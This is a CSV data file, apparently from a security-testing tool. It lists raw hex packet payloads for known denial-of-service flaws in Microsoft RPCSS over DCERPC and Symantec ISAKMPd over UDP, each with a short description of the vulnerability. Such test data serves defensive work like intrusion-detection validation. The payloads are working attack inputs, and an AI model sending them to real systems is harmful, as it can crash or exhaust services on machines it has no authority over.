XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20040420-02_Microsoft_RPCSS_Denial_of_Service.xml,Microsoft RPCSS Denial of Service,"Due to incorrect handling of malformed RPC packets, a function in the RPCSS service that is responsible for the allocation of memory can be exploited remotely to exhaust all available memory on a vulnerable system. The RPCSS service is the Remote Procedure Call service running on Windows computers.",DCERPC,TCP,[[05 00 0B 03 10 00 00 00 ]]H[[00 00 00 07 00 00 00 D0 16 D0 16 00 00 00 00 01 00 00 00 01 00 01 00 A0 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[00 00 00 00 04 ]]][[88 8A EB 1C C9 11 9F E8 08 00 ]]+[[10 ]]H`[[02 00 00 00]]
FSC20040420-02_Microsoft_RPCSS_Denial_of_Service.xml,Microsoft RPCSS Denial of Service,"Due to incorrect handling of malformed RPC packets, a function in the RPCSS service that is responsible for the allocation of memory can be exploited remotely to exhaust all available memory on a vulnerable system. The RPCSS service is the Remote Procedure Call service running on Windows computers.",DCERPC,TCP,"[[05 00 00 03 10 00 00 00 D8 03 00 00 06 00 00 00 B8 03 00 00 01 00 04 00 05 00 06 00 01 00 00 00 00 00 00 00 ]]/[[05 84 FC F1 ]]pUJ[[95 8F ]]?[[A7 B3 C6 05 09 00 00 00 00 00 00 00 00 08 ]]01[[17 88 03 00 00 88 03 00 00 ]]MEOW[[04 00 00 00 A2 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F8[[03 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[00 00 00 00 ]]X[[03 00 00 ]]P[[03 00 00 00 00 00 00 01 10 08 00 CC CC CC CC C8 00 00 00 00 00 00 00 ]]P[[03 00 00 F0 00 00 00 00 00 00 00 02 00 00 00 07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1C DB ]]F[[00 BC DB ]]F[[00 00 00 00 00 07 00 00 00 B9 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[AB 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[A5 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[A6 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[A4 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[AD 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[AA 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[07 00 00 00 ]]`[[00 00 00 ]]p[[00 00 00 90 00 00 00 ]]P[[00 00 00 ]] [[00 00 00 ]]`[[00 00 00 ]]0[[00 00 00 01 10 08 00 CC CC CC CC D8 00 00 00 00 00 00 00 01 00 00 00 A0 A4 09 00 98 E6 09 00 01 10 08 00 CC CC CC CC ]]P[[00 00 00 00 00 00 00 FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 10 08 00 CC CC CC CC ]]H[[00 00 00 00 00 00 00 B8 ]]J[[9F ]]M[[1C ]]}[[FC 11 86 1E 00 ]] [[AF ]]n|W[[10 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ]]H[[DE 0F 00 ]]p[[00 00 00 05 00 06 00 01 00 00 00 ]]1[[01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[0E 00 FF FF 00 00 11 00 FF FF 00 00 12 00 FF FF 00 00 00 00 F8 EB 09 00 00 00 00 00 01 10 08 00 CC CC CC CC 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]p""$[[00 00 00 00 00 ]]`[[00 00 00 ]]`[[00 00 00 ]]MEOW[[04 00 00 00 C0 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F;[[03 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[00 00 00 00 ]]0[[00 00 00 01 00 01 00 CB C2 B2 ]]7[[1F ]]C[[AB ]]A[[AD 93 CE 12 ]]6fm[[0E 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 10 08 00 CC CC CC CC ]]@[[00 00 00 00 00 00 00 00 00 00 00 C0 12 ]]4[[17 00 00 00 00 00 00 00 00 D8 CF ]]4[[17 00 00 00 00 00 00 00 00 0A 00 00 00 00 00 00 00 0A 00 00 00 ]]1[[00 ]]0[[00 ]].[[00 ]]2[[00 ]].[[00 ]]1[[00 ]].[[00 ]]7[[00 ]]7[[00 00 00 ]][[[00 ]]O[[00 01 10 08 00 CC CC CC CC 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 10 08 00 CC CC CC CC ]]P[[00 00 00 00 00 00 00 80 CF 08 00 00 00 00 00 00 00 00 00 00 00 00 00 1A 00 00 00 01 00 00 00 1A 00 00 01 ]]\[[00 ]]\[[00 ]]F[[00 ]]S[[00 ]]C[[00 ]].[[00 ]]P[[00 ]]O[[00 ]]C[[00 ]].[[00 ]]T[[00 ]]E[[00 ]]S[[00 ]]T[[00 ]]\[[00 ]]c[[00 ]]$[[00 ]]\[[00 ]]p[[00 ]]o[[00 ]]c[[00 ]]t[[00 ]]e[[00 ]]s[[00 ]]t[[00 00 00 01 10 08 00 CC CC CC CC ]] [[00 00 00 00 00 00 00 00 00 00 00 D0 ]]W[[09 00 02 00 00 00 01 00 00 00 ]]`[[E2 09 00 01 00 00 00 07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]"
FSC20040420-02_Microsoft_RPCSS_Denial_of_Service.xml,Microsoft RPCSS Denial of Service,"Due to incorrect handling of malformed RPC packets, a function in the RPCSS service that is responsible for the allocation of memory can be exploited remotely to exhaust all available memory on a vulnerable system. The RPCSS service is the Remote Procedure Call service running on Windows computers.",DCERPC,TCP,[[05 00 0C 03 10 00 00 00 ]]<[[00 00 00 07 00 00 00 D0 16 D0 16 AA B3 00 00 04 00 ]]135[[00 00 00 01 00 00 00 00 00 00 00 04 ]]][[88 8A EB 1C C9 11 9F E8 08 00 ]]+[[10 ]]H`[[02 00 00 00]]
FSC20040420-02_Microsoft_RPCSS_Denial_of_Service.xml,Microsoft RPCSS Denial of Service,"Due to incorrect handling of malformed RPC packets, a function in the RPCSS service that is responsible for the allocation of memory can be exploited remotely to exhaust all available memory on a vulnerable system. The RPCSS service is the Remote Procedure Call service running on Windows computers.",DCERPC,TCP,[[05 00 02 03 10 00 00 00 ]]([[00 00 00 06 00 00 00 10 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]T[[01 04 80]]
﻿FSC20040420-02_Microsoft_RPCSS_Denial_of_Service_IPv6.xml,Microsoft RPCSS Denial of Service (IPv6 Version),"Due to incorrect handling of malformed RPC packets, a function in the RPCSS service that is responsible for the allocation of memory can be exploited remotely to exhaust all available memory on a vulnerable system. The RPCSS service is the Remote Procedure Call service running on Windows computers. (IPv6 Version)",DCERPC/IPv6,TCP,[[05 00 0B 03 10 00 00 00 ]]H[[00 00 00 07 00 00 00 D0 16 D0 16 00 00 00 00 01 00 00 00 01 00 01 00 A0 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[00 00 00 00 04 ]]][[88 8A EB 1C C9 11 9F E8 08 00 ]]+[[10 ]]H`[[02 00 00 00]]
FSC20040420-02_Microsoft_RPCSS_Denial_of_Service_IPv6.xml,Microsoft RPCSS Denial of Service (IPv6 Version),"Due to incorrect handling of malformed RPC packets, a function in the RPCSS service that is responsible for the allocation of memory can be exploited remotely to exhaust all available memory on a vulnerable system. The RPCSS service is the Remote Procedure Call service running on Windows computers. (IPv6 Version)",DCERPC/IPv6,TCP,"[[05 00 00 03 10 00 00 00 D8 03 00 00 06 00 00 00 B8 03 00 00 01 00 04 00 05 00 06 00 01 00 00 00 00 00 00 00 ]]/[[05 84 FC F1 ]]pUJ[[95 8F ]]?[[A7 B3 C6 05 09 00 00 00 00 00 00 00 00 08 ]]01[[17 88 03 00 00 88 03 00 00 ]]MEOW[[04 00 00 00 A2 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F8[[03 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[00 00 00 00 ]]X[[03 00 00 ]]P[[03 00 00 00 00 00 00 01 10 08 00 CC CC CC CC C8 00 00 00 00 00 00 00 ]]P[[03 00 00 F0 00 00 00 00 00 00 00 02 00 00 00 07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1C DB ]]F[[00 BC DB ]]F[[00 00 00 00 00 07 00 00 00 B9 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[AB 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[A5 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[A6 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[A4 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[AD 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[AA 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[07 00 00 00 ]]`[[00 00 00 ]]p[[00 00 00 90 00 00 00 ]]P[[00 00 00 ]] [[00 00 00 ]]`[[00 00 00 ]]0[[00 00 00 01 10 08 00 CC CC CC CC D8 00 00 00 00 00 00 00 01 00 00 00 A0 A4 09 00 98 E6 09 00 01 10 08 00 CC CC CC CC ]]P[[00 00 00 00 00 00 00 FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 10 08 00 CC CC CC CC ]]H[[00 00 00 00 00 00 00 B8 ]]J[[9F ]]M[[1C ]]}[[FC 11 86 1E 00 ]] [[AF ]]n|W[[10 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ]]H[[DE 0F 00 ]]p[[00 00 00 05 00 06 00 01 00 00 00 ]]1[[01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[0E 00 FF FF 00 00 11 00 FF FF 00 00 12 00 FF FF 00 00 00 00 F8 EB 09 00 00 00 00 00 01 10 08 00 CC CC CC CC 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]p""$[[00 00 00 00 00 ]]`[[00 00 00 ]]`[[00 00 00 ]]MEOW[[04 00 00 00 C0 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F;[[03 00 00 00 00 00 00 C0 00 00 00 00 00 00 ]]F[[00 00 00 00 ]]0[[00 00 00 01 00 01 00 CB C2 B2 ]]7[[1F ]]C[[AB ]]A[[AD 93 CE 12 ]]6fm[[0E 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 10 08 00 CC CC CC CC ]]@[[00 00 00 00 00 00 00 00 00 00 00 C0 12 ]]4[[17 00 00 00 00 00 00 00 00 D8 CF ]]4[[17 00 00 00 00 00 00 00 00 0A 00 00 00 00 00 00 00 0A 00 00 00 ]]1[[00 ]]0[[00 ]].[[00 ]]2[[00 ]].[[00 ]]1[[00 ]].[[00 ]]7[[00 ]]7[[00 00 00 ]][[[00 ]]O[[00 01 10 08 00 CC CC CC CC 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 10 08 00 CC CC CC CC ]]P[[00 00 00 00 00 00 00 80 CF 08 00 00 00 00 00 00 00 00 00 00 00 00 00 1A 00 00 00 01 00 00 00 1A 00 00 01 ]]\[[00 ]]\[[00 ]]F[[00 ]]S[[00 ]]C[[00 ]].[[00 ]]P[[00 ]]O[[00 ]]C[[00 ]].[[00 ]]T[[00 ]]E[[00 ]]S[[00 ]]T[[00 ]]\[[00 ]]c[[00 ]]$[[00 ]]\[[00 ]]p[[00 ]]o[[00 ]]c[[00 ]]t[[00 ]]e[[00 ]]s[[00 ]]t[[00 00 00 01 10 08 00 CC CC CC CC ]] [[00 00 00 00 00 00 00 00 00 00 00 D0 ]]W[[09 00 02 00 00 00 01 00 00 00 ]]`[[E2 09 00 01 00 00 00 07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]"
FSC20040420-02_Microsoft_RPCSS_Denial_of_Service_IPv6.xml,Microsoft RPCSS Denial of Service (IPv6 Version),"Due to incorrect handling of malformed RPC packets, a function in the RPCSS service that is responsible for the allocation of memory can be exploited remotely to exhaust all available memory on a vulnerable system. The RPCSS service is the Remote Procedure Call service running on Windows computers. (IPv6 Version)",DCERPC/IPv6,TCP,[[05 00 0C 03 10 00 00 00 ]]<[[00 00 00 07 00 00 00 D0 16 D0 16 AA B3 00 00 04 00 ]]135[[00 00 00 01 00 00 00 00 00 00 00 04 ]]][[88 8A EB 1C C9 11 9F E8 08 00 ]]+[[10 ]]H`[[02 00 00 00]]
FSC20040420-02_Microsoft_RPCSS_Denial_of_Service_IPv6.xml,Microsoft RPCSS Denial of Service (IPv6 Version),"Due to incorrect handling of malformed RPC packets, a function in the RPCSS service that is responsible for the allocation of memory can be exploited remotely to exhaust all available memory on a vulnerable system. The RPCSS service is the Remote Procedure Call service running on Windows computers. (IPv6 Version)",DCERPC/IPv6,TCP,[[05 00 02 03 10 00 00 00 ]]([[00 00 00 06 00 00 00 10 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]T[[01 04 80]]
﻿FSC20040825-01_Symantec_Multiple_Products_ISAKMPd_Denial_of_Service.xml,Symantec Multiple Products ISAKMPd Denial of Service,A vulnerability exists in the way a component of multiple Symantec products processes ISAKMP messages. The vulnerability allows a malicious user to create a denial of service condition on the targeted service.,ISAKMP,UDP,[[A8 ]]`[[87 ]]o[[15 A9 ]]0[[F4 00 00 00 00 00 00 00 00 01 10 02 00 00 00 00 00 00 00 00 ]]0[[00 00 00 14 00 00 00 01 00 00 00 05 00 00 ]][[FF 01 01 00 00]]
﻿FSC20040825-01_Symantec_Multiple_Products_ISAKMPd_Denial_of_Service_IPv6.xml,Symantec Multiple Products ISAKMPd Denial of Service (IPv6 Version),A vulnerability exists in the way a component of multiple Symantec products processes ISAKMP messages. The vulnerability allows a malicious user to create a denial of service condition on the targeted service. (IPv6 Version),ISAKMP/IPv6,UDP,[[A8 ]]`[[87 ]]o[[15 A9 ]]0[[F4 00 00 00 00 00 00 00 00 01 10 02 00 00 00 00 00 00 00 00 ]]0[[00 00 00 14 00 00 00 01 00 00 00 05 00 00 ]][[FF 01 01 00 00]]
